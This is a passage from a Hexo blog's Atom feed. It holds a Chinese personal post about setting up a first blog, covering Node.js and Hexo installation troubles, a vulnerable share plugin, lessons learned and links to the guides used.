href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>First Blog</title>
    <link href="http://example.com/2022/11/03/first_blog/"/>
    <id>http://example.com/2022/11/03/first_blog/</id>
    <published>2022-11-02T16:00:00.000Z</published>
    <updated>2022-11-03T16:14:18.556Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Christina.png" alt="Kurisu Makise"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次搭建博客是我第一次搭建，总共花费了我两天两夜，过程很煎熬，遇到了不少挫折，不过还是很值得，我对此毫不后悔。</p><h1 id="想法萌芽"><a href="#想法萌芽" class="headerlink" title="想法萌芽"></a>想法萌芽</h1><p>搭建这个博客是因为想到要开始学web安全的技术，有很多知识点需要记录查阅。于是在网上查，看到了一篇名叫<a href="https://zhuanlan.zhihu.com/p/102592286">从零开始搭建个人博客</a>的文章，正是因为看到了这篇文章我才知道搭建博客并没有我想象中那么难。从而开始了博客之旅。</p><h1 id="所需能力"><a href="#所需能力" class="headerlink" title="所需能力"></a>所需能力</h1><p>搭完博客后，我认为如果只是想搭一个普通的博客，其中的技术含量并没有多少。困难之处通常是因为网上的文章过时或是与自己的配置不和而导致的出错等。唯一需要的是耐心与查阅资料的能力。<br><del>在搭建博客期间最擅长的代码</del>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure><h1 id="关于域名"><a href="#关于域名" class="headerlink" title="关于域名"></a>关于域名</h1><p>本来想买域名的，但我重新审视了自己的内心之后，发现其实买域名只是为了满足自己的虚荣心。在现阶段根本不需要域名。于是最终放弃了购买域名。我想，等我发表了10篇<strong>有点内容</strong>的博客后我再购买域名吧。</p><h1 id="挫折点"><a href="#挫折点" class="headerlink" title="挫折点"></a>挫折点</h1><ol><li><strong>git与GitHub连接</strong>。由于我自己的大意以及参考文章的不严谨导致第一天晚上多熬了一个多小时的夜。</li><li><strong>安装node.js和Hexo</strong>。先是更改nodejs的配置环境，从C盘到D盘。这步倒还好，顺利进行了。但随之而来的Hexo的安装就惨了。因为前面nodejs的配置不是通常情况，参考文章也偶尔出错，导致我不断报错。而每次报错我又到网上查原因，再根据其它文章打补丁。一来二去，问题没解决，头却大了。就这个问题，让我在电脑前像僵尸一样坐了三个多小时，最后气得我把nodejs和hexo及其相关文件全卸载，所有网页全关了。之后重新下载，在网上随便找了篇文章。竟然奇迹般十分钟就解决了（应该说本来就只该花这点时间吗&#x2F;(ㄒoㄒ)&#x2F;~~）</li><li><strong>美化网页</strong>。完全是大意了，本以为网站都搭好了，应该不会出现什么问题了，于是在网上东找一点西找一点，未曾想落入了大意的圈套。这个圈套就是“分享”。不知道看了谁的文章，稀里糊涂下载了分享模块，结果出现了无论如何也无法消灭的高危漏洞。这便是噩梦的开始，恶魔的降临，恶意的迸发。心力憔悴地折腾了四个小时后，我最终不甘心地向现实低头–卸载所有内容，网站从零开始。</li></ol><h1 id="经验教训"><a href="#经验教训" class="headerlink" title="经验教训"></a>经验教训</h1><ul><li>最好找<strong>2年</strong>以内的文章。太久远的由于时效性往往会导致不兼容或是其它错误。</li><li>最好看那些<em>评论数多或是点赞多</em>的文章。以便能够顺利搭建，即便不能也可以看看和自己有类似情况或是已经解决问题的人。</li><li><em>多对比慎操作</em>。不要看到一篇文章怎么写就马上实操，尽量多搜几篇文章看看他们的处理方案，从中选优。毕竟试错成本可能会很高。</li><li>自己操作的时候要<em>看清楚</em>。多花两分钟看，总比多花两小时排错好。</li><li>保持<em>耐心</em>。实在厌烦排错的时候不妨重装。</li><li>网站不要放到<em>社交平台</em>上。容易被盯上网站被黑。（等我啥时候安全技术强了就不怕了,,ԾㅂԾ,,）</li></ul><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ol><li>这篇文章是我搭建博客的开始，虽然有些问题，不过不影响我对它的感谢。<br><a href="https://zhuanlan.zhihu.com/p/102592286">从零开始搭建个人博客</a></li><li>虽然是在2017年写就的文章，过了5年到如今仍然适用。也是这篇文章把我从第2个挫折点的痛苦旋涡中解救出来。<br><a href="https://www.jianshu.com/p/3f2fe426edff">在Windows环境下使用hexo搭建博客</a></li><li>在我优化博客的时候有许多优质文章提供了帮助。</li></ol><p><a href="https://kumarinko.gitee.io/2022/01/01/Build_hexo-next_Blog/">hexo-next博客搭建</a></p><p><a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next 主题博客个性化配置超详细，超全面</a></p><p><a href="https://cloud.tencent.com/developer/article/1952241">hexo插件篇</a></p><p><a href="https://blog.csdn.net/qnhnt/article/details/126330886">Hexo-NexT v8.x字数统计以及阅读时间配置</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Christina.png&quot; alt=&quot;Kurisu Makise&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
    
    
    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
    
    <category term="搭建博客" scheme="http://example.com/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
</feed>
